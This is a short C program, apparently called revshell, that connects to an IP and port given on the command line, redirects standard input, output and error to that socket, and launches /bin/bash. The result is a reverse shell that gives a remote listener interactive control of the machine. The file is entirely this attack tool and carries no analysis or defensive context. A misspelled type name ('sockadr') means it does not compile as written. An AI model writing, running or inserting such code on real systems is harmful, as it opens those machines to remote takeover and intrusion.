#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]){
  // IP and Port from args ./revshell [ip] [port]
  const char* ip = argv[1];
  const int port = atoi(argv[2]);
  struct sockaddr_in addr;

  // initialize socket
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  inet_aton(ip, &addr.sin_addr);

  // Connecting to listener
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  connect(sockfd, (struct sockadr * )&addr, sizeof(addr));

  for(int i = 0; i < 3; i ++){
    dup2(sockfd, i);
  }
  execve("/bin/bash", NULL, NULL);
  return 0;
}
